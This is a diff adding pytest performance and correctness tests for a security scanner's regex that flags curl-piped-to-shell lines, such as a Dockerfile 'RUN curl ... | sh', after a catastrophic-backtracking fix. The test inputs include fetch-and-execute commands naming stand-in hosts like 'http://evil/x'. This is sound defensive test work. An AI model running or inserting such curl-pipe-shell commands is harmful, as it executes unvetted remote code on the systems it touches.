@@ -690,3 +690,78 @@ class TestCsharpAdversarial:
         """``Process.Start(userInput)`` → TS-CE-011 CRITICAL."""
         assert "TS-CE-011" in _CS_RULES
         assert _CS_RULES["TS-CE-011"].severity.value == "CRITICAL"
+
+
+@pytest.mark.performance
+class TestCurlPipeShellRedos:
+    """``_CURL_PIPE_SHELL_RE`` must stay linear on hostile shell lines.
+
+    The pattern was ``curl\\s+[^|]+?\\s*\\|\\s*(?:sh|bash|...)``. ``\\s`` is
+    a subset of ``[^|]``, so the leading ``\\s+``, the lazy ``[^|]+?`` and
+    the trailing ``\\s*`` could all claim the same whitespace, and a line
+    that does not match forced the engine through every split — cubic in
+    the whitespace run. A Dockerfile line of a few kilobytes hung the scan
+    for tens of seconds, which suppresses the HIGH TS-CE-005 that very
+    line carries: the finding never gets reported because the scan never
+    finishes.
+    """
+
+    @pytest.mark.requirement("SEC-NEW-19")
+    def test_adversarial_line_matches_in_linear_time(self):
+        import time
+
+        from scarno.findings.engine import _CURL_PIPE_SHELL_RE
+
+        # Non-matching: the engine must exhaust the alternatives to fail.
+        line = "RUN curl " + " " * 20_000 + "http://evil/x" + " " * 20_000 + "| notashell"
+        start = time.monotonic()
+        assert _CURL_PIPE_SHELL_RE.search(line) is None
+        elapsed = time.monotonic() - start
+        # The old pattern needed ~37 s for a 6 KB line; this one is 40 KB.
+        assert elapsed < 1.0, (
+            f"curl-pipe matcher took {elapsed:.2f}s on a {len(line)}-byte "
+            f"line — the pattern has become ambiguous again"
+        )
+
+    @pytest.mark.requirement("SEC-NEW-19")
+    def test_growth_is_not_superlinear(self):
+        """Timing alone can pass on a fast machine; the *shape* of the
+        growth curve is what distinguishes linear from cubic."""
+        import time
+
+        from scarno.findings.engine import _CURL_PIPE_SHELL_RE
+
+        def cost(n: int) -> float:
+            line = "RUN curl " + " " * n + "http://e/x" + " " * n + "| notashell"
+            start = time.monotonic()
+            for _ in range(50):
+                _CURL_PIPE_SHELL_RE.search(line)
+            return time.monotonic() - start
+
+        small = cost(2_000)
+        large = cost(16_000)
+        # 8x the input. Linear would be ~8x the time; cubic ~512x. Allow a
+        # generous margin for timer noise on a loaded CI box.
+        assert large < max(small * 40, 0.5), (
+            f"8x input cost {large / max(small, 1e-9):.0f}x the time — "
+            f"superlinear growth"
+        )
+
+    @pytest.mark.requirement("SEC-NEW-19")
+    @pytest.mark.parametrize("line,expected", [
+        ("RUN curl -sSL http://e/x | sh", True),
+        ("curl a |bash", True),
+        ("curl  |sh", True),          # two spaces: whitespace satisfies [^|]+
+        ("RUN curl x|python3", True),
+        ("curl |sh", False),          # one space: nothing left for [^|]+
+        ("curl x | grep y | sh", False),   # [^|] cannot cross the first pipe
+        ("curl x | shell", False),    # \b prevents the prefix match
+        ("echo|sh", False),
+    ])
+    def test_detection_unchanged(self, line, expected):
+        """The rewrite is the same language, not a broader or narrower
+        one. These cases pin the boundaries that the old and new patterns
+        agree on — including the two that look like near-misses."""
+        from scarno.findings.engine import _CURL_PIPE_SHELL_RE
+
+        assert bool(_CURL_PIPE_SHELL_RE.search(line)) is expected
